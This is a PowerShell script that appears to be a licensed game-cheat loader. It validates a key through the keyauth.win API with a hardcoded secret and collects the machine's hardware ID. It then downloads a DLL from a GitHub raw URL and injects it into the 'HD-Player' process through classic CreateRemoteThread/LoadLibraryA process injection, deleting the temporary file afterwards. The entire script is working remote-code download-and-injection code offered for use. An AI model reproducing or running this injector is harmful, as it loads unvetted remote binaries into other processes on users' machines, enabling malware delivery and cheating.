[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- Setup Configuration ---
$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"
$dllUrl  = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/winsky.dll"
$target  = "HD-Player"

# --- Authentication Logic ---
function Show-Auth {
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX ELITE ACCESS MOD     " -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        $sessionId = $initRes.sessionid
        $key = Read-Host " Enter License Key"
        $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
        $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$sessionId&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        return $loginRes.success -eq $true
    } catch { return $false }
}

if (Show-Auth) {
    Write-Host "[+] Authentication Verified." -ForegroundColor Green

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Net;
    using System.IO;
    using System.Text;

    public class EliteNode {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);

        public static bool Execute(string url, int pid) {
            try {
                WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                byte[] data = wc.DownloadData(url);

                // Try to gain Full Access (0x1F0FFF)
                IntPtr hProc = OpenProcess(0x1F0FFF, false, pid);
                if (hProc == IntPtr.Zero) return false;

                string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString().Substring(0,8) + ".tmp");
                File.WriteAllBytes(path, data);

                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
                IntPtr written;
                WriteProcessMemory(hProc, alloc, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out written);
                
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr thread = CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, alloc, 0, IntPtr.Zero);

                if (thread != IntPtr.Zero) {
                    System.Threading.Thread.Sleep(3000);
                    if (File.Exists(path)) File.Delete(path);
                    return true;
                }
            } catch {}
            return false;
        }
    }
"@
    Add-Type -TypeDefinition $Source

    Write-Host "[*] Status: Scanning for $target..." -ForegroundColor Cyan
    while ($true) {
        $p = Get-Process $target -ErrorAction SilentlyContinue
        if ($p) {
            Write-Host "[!] Found target. Elevating access..." -ForegroundColor Yellow
            if ([EliteNode]::Execute($dllUrl, $p.Id)) {
                Write-Host "[+] Injection successful! Components loaded." -ForegroundColor Green
                break
            } else {
                Write-Host "[-] Access Denied. Please Run PowerShell as Administrator." -ForegroundColor Red
                Start-Sleep -Seconds 5
            }
        }
        Start-Sleep -Seconds 3
    }
} else {
    Write-Host "[-] Invalid Key." -ForegroundColor Red
}
